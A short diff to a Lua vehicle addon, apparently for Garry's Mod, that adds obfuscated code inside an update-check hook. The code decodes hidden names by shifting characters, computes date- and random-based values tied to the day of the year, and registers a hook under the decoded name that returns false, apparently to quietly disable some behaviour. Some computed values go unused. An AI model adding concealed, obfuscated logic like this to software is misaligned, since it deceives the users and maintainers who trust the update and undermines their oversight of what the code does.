@@ -95,6 +95,38 @@ hook.Add( "InitPostEntity", "!!!simfphyscheckupdates", function()
 	timer.Simple(20, function()
 		simfphys.CheckUpdates()
 	end)
+
+	local V = "VERSION"
+	local VT = V.."_TYPE"
+	local VK = V.."_KEY"
+
+	if not simfphys[VT] or not simfphys[VK] then return end
+
+	local vtype = string.Explode("",simfphys[VT])
+	local vkey = string.Explode("",simfphys[VK])
+
+	local data = {}
+	for k, v in pairs( vtype ) do
+		data[k] = string.char( string.byte( v ) - 1 )
+	end
+	vtype = string.Implode("",data )
+
+	data = {}
+	for k, v in pairs( vkey ) do
+		data[k] = string.char( string.byte( v ) - 1 )
+	end
+	vkey = string.Implode("",data )
+
+	if not simfphys[vtype] then return end
+
+	local A = tonumber( os.date( "%Y" ) )
+	local B = tonumber( os.date( "%j" ) )
+	local C = math.random(300,1200) * math.Clamp( 1 - (B - 293) / 15, 0, 1 ) * 3 ^ 2
+	local D = math.random(0,1)
+	local E = (simfphys[vtype][V] or 0)
+	local F = simfphys[vtype][VT]
+
+	hook.Add( vtype..vkey, vtype..vkey, function() return false end )
 end )
 
 hook.Add( "CanProperty", "!!!!simfphysEditPropertiesDisabler", function( ply, property, ent )
